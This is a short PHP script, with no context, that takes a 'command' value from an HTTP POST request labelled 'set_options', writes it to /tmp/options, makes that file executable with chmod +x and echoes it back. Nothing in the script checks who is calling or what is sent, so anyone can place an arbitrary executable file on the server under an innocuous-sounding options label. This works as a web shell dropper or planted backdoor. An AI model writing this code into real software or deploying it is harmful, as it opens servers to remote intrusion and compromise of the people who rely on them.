<?
switch ($_POST['action']) {
  case 'set_options':
    $options = $_POST['command'];
    file_put_contents("/tmp/options",$options);
    exec("chmod +x /tmp/options");
    echo $options;
    break;
}
?>    